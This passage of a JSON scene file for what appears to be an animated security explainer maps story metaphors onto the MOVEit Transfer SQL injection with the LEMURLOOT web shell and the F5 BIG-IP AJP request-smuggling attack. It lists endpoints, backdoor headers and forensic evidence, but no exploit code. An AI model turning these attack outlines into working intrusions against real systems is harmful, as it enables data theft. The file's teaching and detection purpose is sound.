      "storyCue": "A courier transfer vault accepts guest drop-off tickets before forwarding them to an internal filing clerk. An outsider writes hidden database instructions inside a guest ticket to slip a self-assembling toolbox into the vault ledger, plants a secret back-door teller window, and quietly drains stored client archives.",
      "technicalCue": "INITIAL ACCESS: SESSION POISONING & MOVEITISAPI.DLL SQL INJECTION (CVE-2023-34362) -> PERSISTENCE: .NET DESERIALIZATION & HUMAN2.ASPX (LEMURLOOT) WEBSHELL DROP -> EXFIL & IMPACT: AZURE BLOB CREDENTIAL THEFT & GZIP FILE EXFILTRATION",
      "storyMappings": [
        {
          "storyTerm": "Courier transfer vault",
          "technicalTerm": "Progress MOVEit Transfer managed file server",
          "tone": "amber"
        },
        {
          "storyTerm": "Hidden database instruction",
          "technicalTerm": "SQL injection via ISAPI session header (CVE-2023-34362)",
          "tone": "sky"
        },
        {
          "storyTerm": "Self-assembling toolbox",
          "technicalTerm": "Malicious .NET BinaryFormatter gadget payload",
          "tone": "rose"
        },
        {
          "storyTerm": "Secret back-door teller",
          "technicalTerm": "LEMURLOOT human2.aspx web shell",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-moveit-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Courier transfer vault",
          "subtitle": "Progress MOVEit Transfer managed file server",
          "tone": "amber"
        },
        {
          "id": "net-moveit-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Hidden database instruction",
          "subtitle": "SQL injection via ISAPI session header (CVE-2023-34362)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Slip Then",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "SESSION POISONING & MOVEITISAPI.DLL SQL INJECTION (CVE-2023-34362)",
          "storyExcerpt": "An outsider visits the public guest counter to collect a fresh visitor slip, then immediately submits that slip to the internal filing chute with tampered ledger phrases tucked into the margin to rewrite…",
          "technicalParallel": "Why go through moveitisapi.dll instead of calling SILMachine2.aspx directly?",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Back Out",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": ".NET DESERIALIZATION & HUMAN2.ASPX (LEMURLOOT) WEBSHELL DROP",
          "storyExcerpt": "Using the forged session privileges, the outsider stores a folded clockwork package inside the vault session ledger. When the clerk pulls that entry back out to read it, the package springs open and…",
          "technicalParallel": "The moment the attacker sends their first HTTP request to /human2.aspx, IIS’s worker process (w3wp.exe) automatically invokes the .NET C# compiler (csc.exe) to compile human2.aspx into a DLL inside…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Self-assembling",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "AZURE BLOB CREDENTIAL THEFT & GZIP FILE EXFILTRATION",
          "storyExcerpt": "The outsider returns to the hidden teller window and whispers a secret passphrase printed on a custom envelope margin. Recognizing the passphrase, the window exports customer files and cloud locker…",
          "technicalParallel": "Sending X-siLock-Step1: -2 instructs LEMURLOOT to create or delete a rogue administrator account named \"HealthCheck Service\" so the attacker can erase their session traces after exfiltration.",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Transfer Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Exfil Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Payload Flow",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "cl0p-moveit-transfer-cve-2023-34362",
      "sectionKey": "step-1",
      "sceneKind": "net-moveit-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Chaining /guestaccess.aspx & /moveitisapi/moveitisapi.dll for Unauthenticated SQL Injection (CVE-2023-34362)",
      "storyCue": "An outsider visits the public guest counter to collect a fresh visitor slip, then immediately submits that slip to the internal filing chute with tampered ledger phrases tucked into the margin to rewrite vault session records.",
      "technicalCue": "T1190 · INITIAL ACCESS — As reconstructed by Huntress and Rapid7, the attacker first sends HTTP requests to /api/v1/token and /guestaccess.aspx (creating a valid unauthenticated guest session record in MOVEit’s…",
      "storyMappings": [
        {
          "storyTerm": "Public guest counter",
          "technicalTerm": "POST /guestaccess.aspx session initialization",
          "tone": "amber"
        },
        {
          "storyTerm": "Internal filing chute",
          "technicalTerm": "POST /moveitisapi/moveitisapi.dll handler",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered ledger phrases",
          "technicalTerm": "SQL injection statements inside X-siLock headers",
          "tone": "rose"
        },
        {
          "storyTerm": "Vault session records",
          "technicalTerm": "Backend MOVEit ActiveSessions database table",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-moveit-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Public guest counter",
          "subtitle": "POST /guestaccess.aspx session initialization",
          "tone": "amber"
        },
        {
          "id": "net-moveit-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Internal filing chute",
          "subtitle": "POST /moveitisapi/moveitisapi.dll handler",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Slip Then",
          "stageTag": "STEP 01 · SETUP",
          "title": "Public guest counter",
          "storyExcerpt": "An outsider visits the public guest counter to collect a fresh visitor slip, then immediately submits that slip to the internal filing chute with tampered ledger phrases tucked into the margin…",
          "technicalParallel": "Why go through moveitisapi.dll instead of calling SILMachine2.aspx directly?",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Internal filing chute",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses internal filing chute to advance toward tampered ledger phrases.",
          "technicalParallel": "As reconstructed by Huntress and Rapid7, the attacker first sends HTTP requests to /api/v1/token and /guestaccess.aspx (creating a valid unauthenticated guest session record in MOVEit’s database), and…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Slip Then",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Vault session records",
          "storyExcerpt": "Behind the scenes, vault session records captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Huntress and Mandiant (web log correlation for MOVEit exploitation chains): IIS W3SVC logs showing POST /guestaccess.aspx immediately followed by POST /moveitisapi/moveitisapi.dll action=m2…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Transfer Vault",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Exfil Chute",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Payload Flow",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "cl0p-moveit-transfer-cve-2023-34362",
      "sectionKey": "step-2",
      "sceneKind": "net-moveit-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Injecting a .NET BinaryFormatter Gadget into the Session Table to Drop human2.aspx (LEMURLOOT)",
      "storyCue": "Using the forged session privileges, the outsider stores a folded clockwork package inside the vault session ledger. When the clerk pulls that entry back out to read it, the package springs open and installs a hidden teller window on the web wall.",
      "technicalCue": "T1505.003 · PERSISTENCE — Because the MOVEit database server often runs without xp_cmdshell or direct OS shell privileges, the attacker uses their SQL injection primitive to UPDATE the activesessions table with a…",
      "storyMappings": [
        {
          "storyTerm": "Folded clockwork package",
          "technicalTerm": "Serialized .NET BinaryFormatter exploit object",
          "tone": "amber"
        },
        {
          "storyTerm": "Clerk unfolding the entry",
          "technicalTerm": "Unsafe deserialization during session processing",
          "tone": "sky"
        },
        {
          "storyTerm": "Hidden teller window",
          "technicalTerm": "Dropped /human2.aspx web shell script",
          "tone": "rose"
        },
        {
          "storyTerm": "Vault wall directory",
          "technicalTerm": "Webroot folder served by IIS",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-moveit-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Folded clockwork package",
          "subtitle": "Serialized .NET BinaryFormatter exploit object",
          "tone": "amber"
        },
        {
          "id": "net-moveit-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Clerk unfolding the entry",
          "subtitle": "Unsafe deserialization during session processing",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Back Out",
          "stageTag": "STEP 02 · SETUP",
          "title": "Folded clockwork package",
          "storyExcerpt": "Using the forged session privileges, the outsider stores a folded clockwork package inside the vault session ledger.",
          "technicalParallel": "The moment the attacker sends their first HTTP request to /human2.aspx, IIS’s worker process (w3wp.exe) automatically invokes the .NET C# compiler (csc.exe) to compile human2.aspx into a DLL inside…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Back Out",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Clerk unfolding the entry",
          "storyExcerpt": "When the clerk pulls that entry back out to read it, the package springs open and installs a hidden teller window on the web wall.",
          "technicalParallel": "Because the MOVEit database server often runs without xp_cmdshell or direct OS shell privileges, the attacker uses their SQL injection primitive to UPDATE the activesessions table with a Base64-encoded…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Wall",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Vault wall directory",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across vault wall directory while locking down hidden teller window.",
          "technicalParallel": "Documented in CISA AA23-158A & Huntress: Sysmon EventID 1 (w3wp.exe spawning csc.exe for human2.cmdline) and EventID 11 (C:\\MOVEitTransfer\\wwwroot\\human2.aspx).",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Transfer Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Exfil Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Payload Flow",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "step-3": {
      "scenarioId": "cl0p-moveit-transfer-cve-2023-34362",
      "sectionKey": "step-3",
      "sceneKind": "net-moveit-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Authenticating to human2.aspx via X-siLock-Comment to Exfiltrate Azure Blob Keys & Files",
      "storyCue": "The outsider returns to the hidden teller window and whispers a secret passphrase printed on a custom envelope margin. Recognizing the passphrase, the window exports customer files and cloud locker credentials directly out the door.",
      "technicalCue": "T1530 · EXFIL & IMPACT — As Mandiant documented in their analysis of LEMURLOOT, the attacker sends HTTPS requests to /human2.aspx carrying a 36-character secret password inside the HTTP header X-siLock-Comment (so…",
      "storyMappings": [
        {
          "storyTerm": "Hidden teller window",
          "technicalTerm": "Deployed human2.aspx web backdoor",
          "tone": "amber"
        },
        {
          "storyTerm": "Envelope margin passphrase",
          "technicalTerm": "Custom X-siLock-Comment authentication header",
          "tone": "sky"
        },
        {
          "storyTerm": "Order slip code",
          "technicalTerm": "X-siLock-Step1 command selector header",
          "tone": "rose"
        },
        {
          "storyTerm": "Customer storage lockers",
          "technicalTerm": "Stored tenant files and Azure Blob credentials",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-moveit-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Hidden teller window",
          "subtitle": "Deployed human2.aspx web backdoor",
          "tone": "amber"
        },
        {
          "id": "net-moveit-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Envelope margin passphrase",
          "subtitle": "Custom X-siLock-Comment authentication header",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Out Door",
          "stageTag": "STEP 03 · SETUP",
          "title": "Hidden teller window",
          "storyExcerpt": "The outsider returns to the hidden teller window and whispers a secret passphrase printed on a custom envelope margin.",
          "technicalParallel": "Sending X-siLock-Step1: -2 instructs LEMURLOOT to create or delete a rogue administrator account named \"HealthCheck Service\" so the attacker can erase their session traces after exfiltration.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Out Door",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Envelope margin passphrase",
          "storyExcerpt": "Recognizing the passphrase, the window exports customer files and cloud locker credentials directly out the door.",
          "technicalParallel": "As Mandiant documented in their analysis of LEMURLOOT, the attacker sends HTTPS requests to /human2.aspx carrying a 36-character secret password inside the HTTP header X-siLock-Comment (so anyone…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Slip Code",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Customer storage lockers",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across customer storage lockers while locking down order slip code.",
          "technicalParallel": "Documented by Mandiant and CISA AA23-158A (web telemetry for LEMURLOOT data theft): HTTP requests to /human2.aspx with X-siLock-Comment and X-siLock-Step1 headers (which act as the backdoor password and…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Transfer Vault",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Exfil Chute",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Payload Flow",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1530"
    },
    "memory-forensics": {
      "scenarioId": "cl0p-moveit-transfer-cve-2023-34362",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-moveit-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "CL0P (FIN11): MOVEit Transfer SQLi, ISAPI Deserialization & LEMURLOOT — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of transfer vault beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: human2.aspx (LEMURLOOT) (App_Web_human2.aspx.dll (LEMURLOOT) [R-X])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of human2.aspx (LEMURLOOT)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007FF891A40000 (R-X, 64 KB) · App_Web_human2.aspx.dll (LEMURLOOT)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against human2.aspx (LEMURLOOT) (PID 5460)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Compiled LEMURLOOT ASP.NET assembly reading X-siLock-Comment, X-siLock-Step1, X-siLock-Step2, and X-siLock-Step3…",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-moveit-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of human2.aspx…",
          "tone": "sky"
        },
        {
          "id": "net-moveit-memory-xray-right",
          "tag": "LIVE MEMORY · R-X",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007FF891A40000 (R-X, 64 KB) · App_Web_human2.aspx.dll…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline human2.aspx (LEMURLOOT) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007FF891A40000 (R-X, 64 KB) containing App_Web_human2.aspx.dll (LEMURLOOT).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 5460 confirms injected region: Compiled LEMURLOOT ASP.NET assembly reading X-siLock-Comment, X-siLock-Step1, X-siLock-Step2, and X-siLock-Step3 headers.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "f5-bigip-request-smuggling": {
    "briefing": {
      "scenarioId": "f5-bigip-request-smuggling",
      "sectionKey": "briefing",
      "sceneKind": "net-f5-smuggle-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "F5 BIG-IP TMUI AJP Request Smuggling to Root RCE — Story-to-Technical Overview",
      "storyCue": "A front lobby receptionist counts sealed parcels differently from the back-office clerk receiving them on a conveyor belt. An outsider packs a second hidden work order inside one parcel so it bypasses the lobby badge desk, creates a new master clerk account, and runs unrestricted commands in the engine room.",
      "technicalCue": "INITIAL ACCESS: TMUI AJP REQUEST SMUGGLING (CVE-2023-46747) -> PERSISTENCE: ROGUE ADMIN ACCOUNT CREATION VIA TMSHCMD.JSP -> EXECUTION: ROOT BASH EXECUTION & SSL PRIVATE KEY EXFILTRATION",
      "storyMappings": [
        {
          "storyTerm": "Front lobby receptionist",
          "technicalTerm": "Front-end Apache reverse-proxy web server",
          "tone": "amber"
        },
        {
          "storyTerm": "Back-office conveyor clerk",
          "technicalTerm": "Internal Tomcat AJP servlet container",
          "tone": "sky"
        },
        {
          "storyTerm": "Second hidden work order",
          "technicalTerm": "Smuggled AJP administrative request (CVE-2023-46747)",
          "tone": "rose"
        },
        {
          "storyTerm": "Engine room terminal",
          "technicalTerm": "Root shell execution through management utility",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-f5-smuggle-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Front lobby receptionist",
          "subtitle": "Front-end Apache reverse-proxy web server",
          "tone": "amber"
        },
        {
          "id": "net-f5-smuggle-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Back-office conveyor clerk",
          "subtitle": "Internal Tomcat AJP servlet container",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Over Desk",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "TMUI AJP REQUEST SMUGGLING (CVE-2023-46747)",
          "storyExcerpt": "The outsider hands over a single oversized parcel at the lobby desk. The receptionist stamps the outer wrapper as harmless, while the back-office clerk splits the parcel along a hidden crease and treats…",
          "technicalParallel": "In a two-tier Apache + Tomcat AJP architecture, Tomcat does not re-verify passwords; it assumes the front-end Apache server already checked the user’s login before setting SC_A_REMOTE_USER.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Book",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "ROGUE ADMIN ACCOUNT CREATION VIA TMSHCMD.JSP",
          "storyExcerpt": "Acting under that smuggled manager stamp, the back-office clerk opens the staff roster book and writes in a brand-new senior supervisor badge with full building and workshop keys, even though nobody ever…",
          "technicalParallel": "When Tomcat processes the smuggled /tmui/Control/form request with SC_A_REMOTE_USER=admin, it communicates with the BIG-IP master control daemon (mcpd) to write the new administrator account into…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Work",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "ROOT BASH EXECUTION & SSL PRIVATE KEY EXFILTRATION",
          "storyExcerpt": "Wearing the newly forged supervisor badge, the outsider walks directly to the engine-room command console and dispatches unrestricted maintenance directives across the entire traffic-routing building.",
          "technicalParallel": "Because an F5 BIG-IP sits at the front of the datacenter terminating TLS connections and load-balancing internal servers, root access on the appliance exposes both private TLS keys and direct network…",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Proxy Mirror",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Back Office",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Smuggled Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "f5-bigip-request-smuggling",
      "sectionKey": "step-1",
      "sceneKind": "net-f5-smuggle-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Smuggling a Forged Second AJP Request Past Front-End Apache via CVE-2023-46747",
      "storyCue": "The outsider hands over a single oversized parcel at the lobby desk. The receptionist stamps the outer wrapper as harmless, while the back-office clerk splits the parcel along a hidden crease and treats the inner slip as a pre-approved manager order.",
      "technicalCue": "T1190 · INITIAL ACCESS — The attacker sends an unauthenticated HTTPS POST request to a reachable TMUI endpoint (/tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp).",
      "storyMappings": [
        {
          "storyTerm": "Outer parcel wrapper",
          "technicalTerm": "Benign front-end HTTP request headers",
          "tone": "amber"
        },
        {
          "storyTerm": "Hidden parcel crease",
          "technicalTerm": "AJP request framing desynchronization flaw",
          "tone": "sky"
        },
        {
          "storyTerm": "Pre-approved manager order",
          "technicalTerm": "Smuggled request targeting /tmui/Control/jspmap/",
          "tone": "rose"
        },
        {
          "storyTerm": "Back-office clerk",
          "technicalTerm": "Backend Tomcat AJP connector listener",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-f5-smuggle-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Outer parcel wrapper",
          "subtitle": "Benign front-end HTTP request headers",
          "tone": "amber"
        },
        {
          "id": "net-f5-smuggle-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Hidden parcel crease",
          "subtitle": "AJP request framing desynchronization flaw",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Over Desk",
          "stageTag": "STEP 01 · SETUP",
          "title": "Outer parcel wrapper",
          "storyExcerpt": "The outsider hands over a single oversized parcel at the lobby desk.",
          "technicalParallel": "In a two-tier Apache + Tomcat AJP architecture, Tomcat does not re-verify passwords; it assumes the front-end Apache server already checked the user’s login before setting SC_A_REMOTE_USER.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Back-office Slip",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Hidden parcel crease",
          "storyExcerpt": "The receptionist stamps the outer wrapper as harmless, while the back-office clerk splits the parcel along a hidden crease and treats the inner slip as a pre-approved manager order.",
          "technicalParallel": "The attacker sends an unauthenticated HTTPS POST request to a reachable TMUI endpoint (/tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Pre-approved",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Back-office clerk",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across back-office clerk while locking down pre-approved manager order.",
          "technicalParallel": "Documented by ProjectDiscovery and F5 K000137353 (vendor advisory detailing authentication bypass traces): /var/log/httpd/httpd_errors and Tomcat logs showing anomalous AJP header parsing and…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Proxy Mirror",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Back Office",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Smuggled Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "f5-bigip-request-smuggling",
      "sectionKey": "step-2",
      "sceneKind": "net-f5-smuggle-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Using the Smuggled Admin Context to Create a Rogue BIG-IP Administrator via form_page",
      "storyCue": "Acting under that smuggled manager stamp, the back-office clerk opens the staff roster book and writes in a brand-new senior supervisor badge with full building and workshop keys, even though nobody ever signed in at the front desk.",
      "technicalCue": "T1136.001 · PERSISTENCE — Executing inside Tomcat under the forged REMOTE_USER=admin identity (which bypasses the outer Apache authentication filter entirely because the smuggled request was born behind the Apache…",
      "storyMappings": [
        {
          "storyTerm": "Staff roster book",
          "technicalTerm": "Appliance configuration user database",
          "tone": "amber"
        },
        {
          "storyTerm": "Senior supervisor badge",
          "technicalTerm": "Rogue administrator account with role=admin",
          "tone": "sky"
        },
        {
          "storyTerm": "Workshop master key",
          "technicalTerm": "Assigned advanced interactive shell access",
          "tone": "rose"
        },
        {
          "storyTerm": "Missing front-desk sign-in",
          "technicalTerm": "Account creation with no prior web login event",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-f5-smuggle-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Staff roster book",
          "subtitle": "Appliance configuration user database",
          "tone": "amber"
        },
        {
